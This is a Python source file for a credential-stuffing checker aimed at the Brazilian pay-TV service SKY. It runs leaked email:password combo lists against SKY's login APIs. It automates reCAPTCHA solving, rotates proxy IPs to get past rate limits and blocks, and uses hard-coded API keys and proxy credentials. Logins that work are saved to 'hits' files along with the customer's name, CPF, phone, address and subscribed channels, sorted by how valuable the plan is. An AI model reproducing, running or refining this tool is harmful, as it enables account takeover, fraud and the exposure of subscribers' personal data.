import os
import sys
import time
import uuid
import json
import base64
import random
import re
import threading
import queue
import urllib.request
import ssl
import cloudscraper
from typing import Optional, Dict, List, Tuple
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# ============================================================
# CONFIGURAÇÃO DE TERMINAL WINDOWS (UTF-8 & ANSI)
# ============================================================
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except AttributeError:
        pass

    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        # Ativa suporte Virtual Terminal (ANSI), UTF-8 e título
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        kernel32.SetConsoleCP(65001)
        kernel32.SetConsoleOutputCP(65001)
        kernel32.SetConsoleTitleW("SKY CHECKER - MASTERON")
    except Exception:
        pass

# Inicializa colorama com suporte a conversão Windows
init(autoreset=True, convert=True)

# Lock para evitar que múltiplas threads embaralhem o terminal ou arquivos
print_lock = threading.Lock()

# Import do solver reCAPTCHA (versão cloudscraper)
from recaptcha_solver import update_payload_session_id, get_recaptcha_token, get_recaptcha_web_token

# ============================================================
# CONSTANTES SKY
# ============================================================

AUTH_URL_ANDROID = "https://sm-sky.vrioservices.com/v2/oauth2/authenticate/android"
AUTH_URL_WEB = "https://sm-sky.vrioservices.com/v2/oauth2/authenticate"
ADDITIONAL_URL = "https://api.skybr.digital/Signature/assets/v2/additional"

WEB_API_KEY = "jVXvhTOQdcPV6xPZSzdFg8z61t1LTqfc"
MOBILE_API_KEY = "lFjeNnPUWOIBNk7avsKdAB5xLtTRE7Qb"

# ============================================================
# CONFIGURAÇÃO DE PROXY (DATAIMPULSE)
# ============================================================

PROXY_USER = os.environ.get("PROXY_USER", "1a1a873f76905f764786")
PROXY_PASS = os.environ.get("PROXY_PASS", "01e103487dc83ae7")
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com")
PROXY_PORT = os.environ.get("PROXY_PORT", "823")

DEFAULT_PROXY = f"http://{PROXY_USER}__sessid.{{sid}}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

# ============================================================
# CLASSE PRINCIPAL
# ============================================================

# Padrões que indicam IP queimado/bloqueado pela Sky
IP_BLOCKED_PATTERNS = ["blocked", "rate limit", "too many", "forbidden"]

# Padrões que indicam credenciais erradas (não adianta tentar de novo)
INVALID_CREDENTIALS_PATTERNS = [
    "invalid_grant",
    "unauthorized",
    "credenciais",
    "senha",
    "subscriber not found",
    "user or password invalid",
    "attempts exceeded",
    "authentication interrupted in sky",
]


def is_pre_pago(sig: dict) -> bool:
    """Verifica se o produto é da modalidade Pré-Pago (sem mensalidade fixa)."""
    if not isinstance(sig, dict):
        return False
    prod_name = str(sig.get("productName", "")).lower()
    sig_type = str(sig.get("type", "")).lower()
    pre_keywords = [
        "pré pago", "pre pago", "pre-pago", "pré-pago",
        "flex", "conforto", "fit pré", "fit pre", "pop",
        "migracao", "migração", "oferta migracao", "oferta migração",
        "recarga", "livre"
    ]
    return any(k in prod_name for k in pre_keywords) or "pré" in sig_type or "pre" in sig_type


def is_signature_active(sig: dict) -> bool:
    """Valida se uma assinatura da SKY é REALMENTE ativa e com plano pago.

    Elimina 100% dos falsos positivos:
      1. status == 1 no sistema Sky apenas indica registro cadastral legado.
      2. productStatus é o status REAL:
         - 'A' = Ativo (Active)
         - 'C' = Cancelado (Cancelled)
         - 'S' = Suspenso (Suspended)
         - 'I' = Inativo (Inactive)
         Se productStatus for 'C', 'S' ou 'I', a assinatura está morta!
      3. 'NOVA PARABOLICA' sintoniza apenas canais abertos gratuitos (não é assinatura paga).
      4. Se dunnLevel indicar cancelamento/corte definitivo, descartar.
      5. PRÉ-PAGO (Oferta Migração, Flex, Conforto, Pop, etc.):
         Aparecem na tela da Sky como 'Opa, sem recarga ativa!' e NÃO possuem canais de TV nem streaming!
    """
    if not isinstance(sig, dict):
        return False

    # 1. status cadastral deve ser 1
    if sig.get("status") != 1:
        return False

    # 2. productStatus deve ser 'A' (Ativo); rejeita C (Cancelado), S (Suspenso), I (Inativo)
    prod_status = str(sig.get("productStatus", "")).strip().upper()
    if prod_status in ["C", "S", "I"]:
        return False
    if prod_status and prod_status != "A":
        return False

    # 3. Descarta se dunnLevel indicar cancelamento
    dunn = str(sig.get("dunnLevel", "")).lower()
    if "cancelamento" in dunn:
        return False

    # 4. Nova Parabólica é gratuita sem assinatura de TV/Streaming
    prod_name = str(sig.get("productName", "")).strip().upper()
    if any(k in prod_name for k in ["NOVA PARABOLICA", "NOVA PARABÓLICA", "PARABOLICA", "PARABÓLICA"]):
        return False

    # 5. Descarta Pré-Pago (causam o erro 'Opa, sem recarga ativa!')
    if is_pre_pago(sig):
        return False

    return True


def get_channel_icon(name: str, category: str = "", subcategory: str = "") -> str:
    """Retorna um ícone adequado para cada tipo de canal ou serviço."""
    text = f"{name} {category} {subcategory}".lower()
    if any(k in text for k in ["adulto", "sex", "prive", "privê", "sexy", "playboy", "venus"]):
        return "🔞"
    if any(k in text for k in ["esporte", "premiere", "sportv", "espn", "combate", "futebol", "esr"]):
        return "⚽"
    if any(k in text for k in ["telecine", "hbo", "cinema", "filme", "movie", "paramount", "max"]):
        return "🎬"
    if any(k in text for k in ["disney", "kids", "infantil", "cartoon", "gloob", "nick"]):
        return "✨"
    if any(k in text for k in ["mundo", "internacional", "nhk", "dw", "rai", "tve", "sic", "europa"]):
        return "🌍"
    if any(k in text for k in ["seguro", "assistencia", "assistência", "serviço", "servico"]):
        return "🛡️"
    return "📺"


class SkyLiteChecker:
    """Sky Lite Checker — usa cloudscraper no lugar de curl_cffi.

    Lógica:
      - IP queimado (403 blocked / 429) → troca de IP na hora e retenta
      - Credenciais inválidas           → para imediatamente (não gasta mais IPs)
      - Erro de reCAPTCHA               → retry no mesmo IP
      - Timeout / erro de rede          → retry com novo IP
    """

    def __init__(
        self,
        base_proxy_template: Optional[str] = None,
        max_ip_burns: int = 10,
        max_retries_per_ip: int = 2,
    ):
        self.base_proxy_template = base_proxy_template
        self.max_ip_burns = max_ip_burns
        self.max_retries_per_ip = max_retries_per_ip
        self.current_proxy_url: Optional[str] = None
        self.session = None
        self._new_ip_session()

    def _generate_new_proxy(self) -> Optional[str]:
        if not self.base_proxy_template:
            return None
        sid = uuid.uuid4().hex[:8]
        self.current_proxy_url = self.base_proxy_template.format(sid=sid)
        return self.current_proxy_url

    def _new_ip_session(self):
        """Cria nova sessão cloudscraper com IP completamente novo."""
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass

        self.session = cloudscraper.create_scraper(
            browser={
                "browser": "chrome",
                "platform": "android",
                "desktop": False,
            },
            delay=1,
        )

        if self.base_proxy_template:
            self._generate_new_proxy()
            self.session.proxies.update({
                "http": self.current_proxy_url,
                "https": self.current_proxy_url
            })

    def recreate_session(self, change_proxy: bool = True):
        """Compatibilidade com process_chunk."""
        self._new_ip_session()

    def _is_ip_blocked(self, status_code: int, text: str) -> bool:
        """Retorna True se o IP foi bloqueado pela Sky (403/429 com blocked)."""
        if status_code == 429:
            return True
        if status_code == 403:
            text_lower = text.lower()
            return any(p in text_lower for p in IP_BLOCKED_PATTERNS)
        return False

    def _is_invalid_credentials(self, text: str) -> bool:
        """Retorna True se as credenciais são definitivamente inválidas."""
        text_lower = text.lower()
        return any(p in text_lower for p in INVALID_CREDENTIALS_PATTERNS)

    def _exchange_refresh_token(self, refresh_token: str) -> Optional[str]:
        """Tenta trocar o refresh_token por um token JWT na rota da Web."""
        if not refresh_token:
            return None
        token_urls = [
            "https://sm-sky.vrioservices.com/v2/oauth2/token",
            "https://sm-sky.vrioservices.com/oauth2/token"
        ]
        headers = {
            "x-environment": "prd",
            "x-user-id": "SiteSKY",
            "x-api-key": WEB_API_KEY,
            "x-consumer-system": "SiteSKY",
            "x-client-type": "web",
            "content-type": "application/json",
            "origin": "https://www.sky.com.br",
            "referer": "https://www.sky.com.br/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        payload = {
            "grantType": "refresh_token",
            "refreshToken": refresh_token,
            "clientId": "sky_br"
        }
        for u in token_urls:
            try:
                res = self.session.post(u, headers=headers, json=payload, timeout=10)
                if res.status_code == 200:
                    d = res.json()
                    tok = d.get("idToken") or d.get("accessToken")
                    if tok and "ey" in str(tok):
                        return tok
            except Exception:
                pass
        return None

    def fetch_additionals(self, signature_id: str, jwt_token: Optional[str] = None, access_token: Optional[str] = None) -> Dict:
        """Busca a lista completa de canais inclusos e adicionais contratados da assinatura."""
        if not signature_id:
            return {"included": [], "additionals": []}

        url = f"{ADDITIONAL_URL}?signatureId={signature_id}"

        # 1. Se temos token JWT da Web, usamos ele diretamente com os headers Web
        if jwt_token:
            token_clean = str(jwt_token).replace("Bearer ", "").strip()
            headers_web = {
                "Host": "api.skybr.digital",
                "x-api-key": WEB_API_KEY,
                "x-user-id": "Site",
                "x-consumer-system": "Site",
                "Authorization": f"Bearer {token_clean}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "*/*",
            }
            # Conexão direta via urllib (100% imune a falhas de túnel SSL de proxy)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers=headers_web, method="GET")
            try:
                with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
                    if resp.status == 200:
                        data = json.loads(resp.read().decode("utf-8", errors="ignore"))
                        return self._parse_additionals_response(data)
            except Exception:
                pass

            # Fallback para self.session
            try:
                resp = self.session.get(url, headers=headers_web, timeout=12)
                if resp.status_code == 200:
                    return self._parse_additionals_response(resp.json())
            except Exception:
                pass

        # 2. Se temos access_token do Android, tentamos com os headers Mobile
        if access_token:
            headers_mobile = {
                "Host": "api.skybr.digital",
                "x-api-key": MOBILE_API_KEY,
                "x-user-id": "APP",
                "x-consumer-system": "Mobile",
                "Authorization": access_token,
                "user-agent": "minhaskyandroid",
                "content-type": "application/json",
            }
            try:
                resp = self.session.get(url, headers=headers_mobile, timeout=15)
                if resp.status_code == 200:
                    return self._parse_additionals_response(resp.json())
            except Exception:
                pass

            # 3. Tenta também Bearer access_token com API key Web
            headers_bearer = {
                "Host": "api.skybr.digital",
                "x-api-key": WEB_API_KEY,
                "x-user-id": "Site",
                "x-consumer-system": "Site",
                "Authorization": f"Bearer {access_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "*/*",
            }
            try:
                resp = self.session.get(url, headers=headers_bearer, timeout=15)
                if resp.status_code == 200:
                    return self._parse_additionals_response(resp.json())
            except Exception:
                pass

        return {"included": [], "additionals": []}

    def get_web_access_token(self, email: str, password: str, payload_web: str) -> Optional[str]:
        """Obtém o accessToken oficial da Web (sm-sky) para a conta que deu HIT."""
        try:
            recaptcha_login = get_recaptcha_web_token(payload_web, proxy=self.current_proxy_url)
            auth_url = "https://sm-sky.vrioservices.com/v2/oauth2/authenticate"
            web_headers = {
                "host": "sm-sky.vrioservices.com",
                "x-environment": "prd",
                "x-user-id": "SiteSKY",
                "x-api-key": WEB_API_KEY,
                "x-consumer-system": "SiteSKY",
                "x-client-type": "web",
                "content-type": "application/json",
                "origin": "https://www.sky.com.br",
                "referer": "https://www.sky.com.br/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
            is_cpf = "@" not in email
            if is_cpf:
                clean_cpf = re.sub(r'\D', '', email)
                if len(clean_cpf) <= 11:
                    clean_cpf = clean_cpf.zfill(11)
                auth_payload = {
                    "grantType": "password",
                    "cpf": clean_cpf,
                    "password": password,
                    "g-recaptcha-response": recaptcha_login
                }
            else:
                auth_payload = {
                    "grantType": "password",
                    "email": email,
                    "password": password,
                    "g-recaptcha-response": recaptcha_login
                }
            resp_auth = self.session.post(auth_url, headers=web_headers, json=auth_payload, timeout=20)
            if resp_auth.status_code == 200:
                return resp_auth.json().get("accessToken")
        except Exception:
            pass
        return None

    def fetch_id_token(self, signature_id: str, web_access_token: str, payload_web: str) -> Optional[str]:
        """Troca o web_access_token pelo id_token (JWT) para a assinatura usando /v2/oauth2/token."""
        token_url = "https://sm-sky.vrioservices.com/v2/oauth2/token"
        token_headers = {
            "host": "sm-sky.vrioservices.com",
            "x-environment": "prd",
            "x-user-id": "SiteSKY",
            "x-api-key": WEB_API_KEY,
            "x-consumer-system": "SiteSKY",
            "x-client-type": "web",
            "content-type": "application/json",
            "origin": "https://www.sky.com.br",
            "referer": "https://www.sky.com.br/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        for _ in range(2):
            try:
                recaptcha_token = get_recaptcha_web_token(payload_web, proxy=self.current_proxy_url)
                token_payload = {
                    "grantType": "authorizationSignature",
                    "signature": str(signature_id),
                    "accessToken": web_access_token,
                    "g-recaptcha-response": recaptcha_token
                }
                resp = self.session.post(token_url, headers=token_headers, json=token_payload, timeout=20)
                if resp.status_code == 200:
                    data = resp.json()
                    return data.get("id_token") or data.get("accessToken")
            except Exception:
                time.sleep(0.5)
        return None

    def _parse_additionals_response(self, data: dict) -> Dict:
        items = data.get("opcional", []) if isinstance(data, dict) else []
        included = []
        additionals = []
        for item in items:
            name = item.get("name") or "Item Desconhecido"
            cat = item.get("category", "")
            subcat = item.get("subcategory", "")
            is_main = item.get("isPartOfMainPackage", False)
            start_date = item.get("startDate") or item.get("activationDate", "")
            end_date = item.get("endDate")
            icon = get_channel_icon(name, cat, subcat)

            entry = {
                "name": name,
                "category": cat,
                "subcategory": subcat,
                "start_date": start_date,
                "end_date": end_date,
                "icon": icon,
            }
            if is_main:
                included.append(entry)
            else:
                additionals.append(entry)
        return {"included": included, "additionals": additionals, "raw": data}

    def check(self, email: str, password: str, original_payload: str, original_web_payload: Optional[str] = None) -> Tuple[bool, Optional[Dict]]:
        email = str(email).strip()
        password = str(password).strip()

        if not email or not password:
            return False, {"error": "Email ou senha vazios", "email": email}

        ip_burns = 0  # quantos IPs já queimamos nesta conta

        # Loop externo: rotaciona IPs quando queimados
        while ip_burns <= self.max_ip_burns:

            # Loop interno: retenta no mesmo IP (recaptcha, timeout)
            for attempt in range(self.max_retries_per_ip):
                try:
                    # Novo IP só no começo ou após queima (não entre retries internos)
                    if attempt == 0 and ip_burns > 0:
                        self._new_ip_session()
                        print(f"{Fore.CYAN}🔄 {email} - Trocando IP (queima #{ip_burns})...{Style.RESET_ALL}")

                    is_email = "@" in email

                    if is_email:
                        # ── ROTA ANDROID (Otimizada e rápida para E-mails) ──
                        new_payload, session_id = update_payload_session_id(original_payload)
                        recaptcha_token = get_recaptcha_token(new_payload, proxy=self.current_proxy_url)

                        device_id = hex(int(time.time() * 1000))[2:15]
                        payload_auth = {
                            "email": email,
                            "grantType": "password",
                            "password": password,
                            "g-recaptcha-response": recaptcha_token
                        }
                        android_headers = {
                            "session-id": session_id,
                            "appversion": "7.116.0",
                            "consumer-key": "ANDROID",
                            "user-agent": "minhaskyandroid",
                            "x-api-key": MOBILE_API_KEY,
                            "x-consumer-system": "Mobile",
                            "x-user-id": "APP",
                            "x-group-code": "APP",
                            "device-id": device_id,
                            "x-client-type": "app",
                            "x-environment": "prd",
                            "content-type": "application/json",
                        }
                        response = self.session.post(
                            AUTH_URL_ANDROID,
                            headers=android_headers,
                            json=payload_auth,
                            timeout=30
                        )
                    else:
                        # ── ROTA WEB (Oficial para CPF, Telefone/Celular e Números) ──
                        clean_digits = re.sub(r'\D', '', email)
                        web_b64 = original_web_payload if original_web_payload else original_payload
                        recaptcha_token = get_recaptcha_web_token(web_b64, proxy=self.current_proxy_url)

                        web_headers = {
                            "host": "sm-sky.vrioservices.com",
                            "x-environment": "prd",
                            "x-user-id": "SiteSKY",
                            "x-api-key": WEB_API_KEY,
                            "x-consumer-system": "SiteSKY",
                            "x-client-type": "web",
                            "content-type": "application/json",
                            "origin": "https://www.sky.com.br",
                            "referer": "https://www.sky.com.br/",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        }

                        # O campo oficial aceito pela SKY Web para contas numéricas é telephoneNumber
                        fields_to_try = ["telephoneNumber"]

                        response = None
                        for field in fields_to_try:
                            payload_auth = {
                                "grantType": "password",
                                field: clean_digits,
                                "password": password,
                                "g-recaptcha-response": recaptcha_token
                            }
                            response = self.session.post(
                                AUTH_URL_WEB,
                                headers=web_headers,
                                json=payload_auth,
                                timeout=30
                            )
                            if response.status_code == 200:
                                break
                            if self._is_ip_blocked(response.status_code, response.text):
                                break

                    # ── SUCESSO ──────────────────────────────────────────────
                    if response is not None and response.status_code == 200:
                        data = response.json()
                        signatures = data.get("signatures", [])
                        active_signatures = [s for s in signatures if is_signature_active(s)]
                        if not active_signatures:
                            return False, {"error": "Sem assinaturas ativas (pré-pago sem recarga / inativa)", "email": email}

                        access_token = data.get("accessToken", "")
                        refresh_token = data.get("refreshToken", "")
                        jwt_token = None

                        # Se ainda não temos jwt_token, tenta obter via troca de refresh_token
                        if not jwt_token and refresh_token:
                            jwt_token = self._exchange_refresh_token(refresh_token)

                        # Se veio da Web, o access_token já é o token Web oficial
                        web_access_token = access_token if not is_email else None
                        if is_email and original_web_payload:
                            web_access_token = self.get_web_access_token(email, password, original_web_payload)

                        additionals_map = {}
                        sig_jwt = None
                        for sig in active_signatures:
                            sig_id = str(sig.get("id") or "")
                            if sig_id:
                                if web_access_token and (original_web_payload or not is_email):
                                    web_b64 = original_web_payload or original_payload
                                    sig_jwt = self.fetch_id_token(sig_id, web_access_token, web_b64)

                                additionals_map[sig_id] = self.fetch_additionals(
                                    signature_id=sig_id,
                                    jwt_token=sig_jwt or jwt_token,
                                    access_token=access_token
                                )

                        return True, {
                            "email": email,
                            "password": password,
                            "access_token": access_token,
                            "jwt_token": sig_jwt or jwt_token or web_access_token,
                            "refresh_token": refresh_token,
                            "raw_data": data,
                            "active_signatures": active_signatures,
                            "additionals_map": additionals_map
                        }

                    # ── IP QUEIMADO → sai do loop interno, pega novo IP ──────
                    if self._is_ip_blocked(response.status_code, response.text):
                        ip_burns += 1
                        break  # sai do for interno → while externo troca IP

                    # ── CREDENCIAIS INVÁLIDAS → para tudo ────────────────────
                    if self._is_invalid_credentials(response.text):
                        return False, {"error": "Credenciais inválidas", "email": email}

                    # ── RECAPTCHA FALHOU → retry no mesmo IP ─────────────────
                    if "recaptcha" in response.text.lower():
                        if attempt < self.max_retries_per_ip - 1:
                            time.sleep(1)
                            continue
                        # esgotou retries no IP atual → trata como IP ruim
                        ip_burns += 1
                        break

                    # ── OUTRO ERRO INESPERADO ─────────────────────────────────
                    print(f"{Fore.YELLOW}⚠️ {email} - HTTP {response.status_code}: {response.text[:150]}...{Style.RESET_ALL}")
                    if attempt < self.max_retries_per_ip - 1:
                        time.sleep(1)
                        continue
                    ip_burns += 1
                    break

                except Exception as e:
                    err = str(e).lower()
                    if "credenciais" in err or "unauthorized" in err:
                        return False, {"error": str(e), "email": email}
                    # Timeout ou erro de rede → retry interno
                    if attempt < self.max_retries_per_ip - 1:
                        time.sleep(1)
                        continue
                    # Esgotou → queima IP e tenta outro
                    ip_burns += 1
                    break

        return False, {"error": f"IPs esgotados ({ip_burns} queimados)", "email": email}

    def close(self):
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass


# ============================================================
# FUNÇÕES DE LOG E DISPLAY
# ============================================================

def sanitize_filename(name: str) -> str:
    """Remove caracteres inválidos para nomes de arquivos no Windows."""
    clean = re.sub(r'[<>:"/\\|?*]', '_', name)
    clean = re.sub(r'\s+', ' ', clean).strip(' ._')
    return clean[:100] or "Outros"

def format_activation_age(activation_str: str) -> str:
    """Formata a data de ativação e calcula o tempo de cliente (ex: 03/04/1998 (26 anos))."""
    if not activation_str:
        return ""
    try:
        # Exemplo da API: "1998-04-03T00:00:00.000Z"
        date_part = str(activation_str).split("T")[0]
        dt = datetime.strptime(date_part, "%Y-%m-%d")
        formatted_date = dt.strftime("%d/%m/%Y")

        now = datetime.now()
        years = now.year - dt.year
        months = now.month - dt.month
        if now.day < dt.day:
            months -= 1
        if months < 0:
            years -= 1
            months += 12

        if years > 0:
            tempo = f"{years} ano(s)" if months == 0 else f"{years} a, {months} m"
        elif months > 0:
            tempo = f"{months} mês(es)"
        else:
            days = max(0, (now - dt).days)
            tempo = f"{days} dia(s)"

        return f"{formatted_date} ({tempo})"
    except Exception:
        return str(activation_str)[:10]

def classify_plan_level(active_signatures: list, additionals_map: Optional[dict] = None) -> str:
    """Classifica o hit em COMPLETAS, MEDIA, BASICA ou PRE_PAGO com base nas assinaturas ativas e adicionais."""
    if not active_signatures:
        return "BASICA"

    plan_names = [str(s.get("productName", "")).lower() for s in active_signatures]

    # Adiciona também os nomes dos canais inclusos e adicionais extraídos
    extra_names = []
    if additionals_map:
        for sig_id, a_data in additionals_map.items():
            if isinstance(a_data, dict):
                for it in a_data.get("included", []) + a_data.get("additionals", []):
                    extra_names.append(str(it.get("name", "")).lower())

    full_text = " ".join(plan_names + extra_names)

    # 1. COMPLETA: Total Experience, Media Center, Premiere, Disney, Telecine, HBO, Top HD, Full, Adultos
    completa_keywords = [
        "total experience", "media center", "premiere", "disney",
        "telecine", "hbo", "cinema", "top hd", "top", "full", "kit top",
        "sex prive", "prive", "privê", "sexy", "playboy", "combate"
    ]
    if any(kw in full_text for kw in completa_keywords):
        return "COMPLETAS"

    # 2. MEDIA: Super HD, Master, Sky Mais / Sky+, Sou+Sky, Pay-TV Fibra, Migração
    media_keywords = [
        "super", "master", "sky mais", "sky+", "sou+sky",
        "pay-tv", "fibra", "migracao", "migração", "advanced"
    ]
    if any(kw in full_text for kw in media_keywords):
        return "MEDIA"

    # 3. PRE_PAGO: Se todas forem Pré-Pago (Flex, Conforto, etc.)
    if all(is_pre_pago(s) for s in active_signatures):
        return "PRE_PAGO"

    # 4. BASICA: Outros planos básicos pós-pagos
    return "BASICA"

def append_hit_if_not_exists(filepath: str, hit_text: str, login_key: str) -> bool:
    """Garante que o arquivo nunca seja apagado (append) e não duplica o login se já existir."""
    existing_content = ""
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                existing_content = f.read()
        except Exception:
            existing_content = ""

    # Se o login já estiver no arquivo, não duplica
    if login_key.lower() in existing_content.lower():
        return False

    # Salva sempre no final (append), NUNCA apaga o que já existe
    with open(filepath, "a", encoding="utf-8", errors="replace") as f:
        f.write(hit_text)
    return True

def print_hit(result: Dict):
    email = result.get("email", "?")
    password = result.get("password", "?")
    raw_data = result.get("raw_data", {})
    additionals_map = result.get("additionals_map", {})

    customer = raw_data.get("customer", {})
    customer_name = f"{customer.get('name', '')} {customer.get('secondName', '')}".strip()
    cpf = customer.get("cpf", "N/A")

    active_signatures = result.get("active_signatures", [])
    raw_signatures = raw_data.get("signatures", [])
    signatures = active_signatures if active_signatures else [s for s in raw_signatures if is_signature_active(s)]
    if not signatures:
        signatures = raw_signatures

    lines = []
    lines.append(("green", "╔═══[Sky Checker - Masteron]═══╗"))
    lines.append(("green", f"║ Login: {email}:{password}"))

    cust_phone = customer.get("mobilePhone") or customer.get("phone")
    cust_email = customer.get("email")
    extra_cust_info = []
    if cpf and cpf != "N/A":
        extra_cust_info.append(f"CPF: {cpf}")
    if cust_phone:
        extra_cust_info.append(f"Tel: {cust_phone}")
    if cust_email and str(cust_email).lower() != str(email).lower():
        extra_cust_info.append(f"Email: {cust_email}")

    if customer_name or extra_cust_info:
        header_text = f"║ Cliente: {customer_name}" if customer_name else "║ Cadastro"
        if extra_cust_info:
            header_text += f" | {' | '.join(extra_cust_info)}"
        lines.append(("green", header_text))

    for idx, sig in enumerate(signatures, 1):
        sig_id = str(sig.get("id") or "")
        product_name = sig.get("productName", "Desconhecido")
        prod_status = str(sig.get("productStatus", "")).strip().upper()
        status_code = sig.get("status")

        if prod_status == "A" and status_code == 1:
            status_str = "Ativo"
        elif prod_status == "C" or status_code == 2:
            status_str = "Cancelado"
        elif prod_status == "S":
            status_str = "Suspenso"
        elif prod_status == "I":
            status_str = "Inativo"
        else:
            status_str = "Ativo" if status_code == 1 else "Inativo"

        sig_type = sig.get("type", "")
        type_str = f" [{sig_type}]" if sig_type else ""
        lines.append(("yellow", f"║ Assinatura {idx}: {product_name}{type_str} ({status_str})"))

        # Junta Local e Data na mesma linha
        activation_raw = sig.get("activation", "")
        age_str = format_activation_age(activation_raw) if activation_raw else ""

        address = sig.get("addressInstallation", {})
        city = address.get("city", "")
        state = address.get("state", "")
        local_str = f"{city} - {state}" if (city and state) else ""

        info_parts = []
        if local_str:
            info_parts.append(f"Local: {local_str}")
        if age_str:
            info_parts.append(f"Desde: {age_str}")

        if info_parts:
            lines.append(("yellow", f"║ {' | '.join(info_parts)}"))

        # ── DETALHAMENTO COMPACTO (INCLUSOS & ADICIONAIS) ────────────
        sig_assets = additionals_map.get(sig_id, {})
        included = sig_assets.get("included", [])
        additionals = sig_assets.get("additionals", [])

        # Formata itens em linha única com quebra inteligente
        def format_compact_block(items, label_prefix, color_name):
            if not items:
                return
            item_strs = []
            for it in items:
                icon = it.get("icon", "📺")
                name = it.get("name", "")
                end_d = it.get("end_date")
                vig = f" [Até: {end_d}]" if end_d else ""
                item_strs.append(f"{icon} {name}{vig}")

            # Agrupa itens em linhas de até 80 caracteres
            curr_line = f"║ {label_prefix}: "
            indent = "║ " + " " * (len(label_prefix) + 2)
            first = True

            for it_str in item_strs:
                if first:
                    curr_line += it_str
                    first = False
                else:
                    if len(curr_line) + len(it_str) + 2 > 80:
                        lines.append((color_name, curr_line))
                        curr_line = indent + it_str
                    else:
                        curr_line += ", " + it_str

            if curr_line.strip() != indent.strip():
                lines.append((color_name, curr_line))

        if included:
            format_compact_block(included, "📦 Inclusos", "cyan")

        if additionals:
            format_compact_block(additionals, "➕ Adicionais", "yellow")

        if not included and not additionals:
            lines.append(("cyan", "║ 📦 Adicionais: Nenhum adicional avulso contratado (Canais do pacote)"))

    lines.append(("green", "╚═══[@Masteron]═══╝"))

    hit_text = "\n".join(text for _, text in lines) + "\n\n"

    with print_lock:
        print()
        for line_color, text in lines:
            if line_color == "yellow":
                print(f"{Fore.YELLOW}{text}{Style.RESET_ALL}")
            elif line_color == "cyan":
                print(f"{Fore.CYAN}{text}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}{text}{Style.RESET_ALL}")

        # Cria pasta 'hits' se não existir
        hits_folder = "hits"
        os.makedirs(hits_folder, exist_ok=True)

        login_identifier = f"Login: {email}:{password}"

        # 1. Salva nos arquivos gerais SEM apagar nada do que já tem e sem duplicar
        append_hit_if_not_exists("Sky_Hits.txt", hit_text, login_identifier)
        append_hit_if_not_exists(os.path.join(hits_folder, "Todos_Hits.txt"), hit_text, login_identifier)

        # 2. Salva na categoria correta com base em assinaturas ativas E adicionais extraídos
        category = classify_plan_level(active_signatures if active_signatures else signatures, additionals_map)
        cat_file = os.path.join(hits_folder, f"{category}.txt")
        is_new = append_hit_if_not_exists(cat_file, hit_text, login_identifier)

        # 3. Salva também o raw JSON completo para consulta detalhada
        try:
            raw_dir = os.path.join(hits_folder, "raw_json")
            os.makedirs(raw_dir, exist_ok=True)
            raw_filename = os.path.join(raw_dir, f"{sanitize_filename(email)}.json")
            with open(raw_filename, "w", encoding="utf-8") as rf:
                json.dump(result, rf, indent=2, ensure_ascii=False)
        except Exception:
            pass

        if is_new:
            print(f"{Fore.GREEN}[+] Hit adicionado em hits/{category}.txt e Todos_Hits.txt (histórico preservado){Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[i] Hit já existia em hits/{category}.txt (mantido sem duplicar){Style.RESET_ALL}")

def print_result(result: Dict, is_hit: bool):
    email = result.get("email", "?")
    error = result.get("error", "")

    if is_hit:
        print_hit(result)
    else:
        with print_lock:
            if "inválidas" in error.lower() or "401" in error:
                print(f"{Fore.RED}❌ {email} - {error}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ {email} - {error}{Style.RESET_ALL}")


# ============================================================
# FUNÇÕES DE LEITURA DE ARQUIVOS
# ============================================================

def load_logins_from_file(filepath: str) -> List[Tuple[str, str]]:
    logins = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                if len(parts) >= 2:
                    logins.append((parts[0], parts[1]))
    return logins

def load_logins_from_combo_folder() -> List[Tuple[str, str]]:
    if not os.path.exists("combo"):
        os.makedirs("combo")

    files = [f for f in os.listdir("combo") if f.endswith(".txt")]
    if not files:
        print(f"{Fore.RED}Nenhum arquivo encontrado na pasta 'combo/'. Crie a pasta e coloque listas lá.{Style.RESET_ALL}")
        return []

    print(f"\n{Fore.CYAN}Arquivos disponíveis:{Style.RESET_ALL}")
    for i, f in enumerate(files):
        print(f"  [{i}] {f}")

    try:
        idx = int(input(f"\n{Fore.GREEN}Escolha: {Style.RESET_ALL}").strip())
        if 0 <= idx < len(files):
            filepath = os.path.join("combo", files[idx])
            return load_logins_from_file(filepath)
    except ValueError:
        pass

    print(f"{Fore.RED}Seleção inválida.{Style.RESET_ALL}")
    return []

# ============================================================
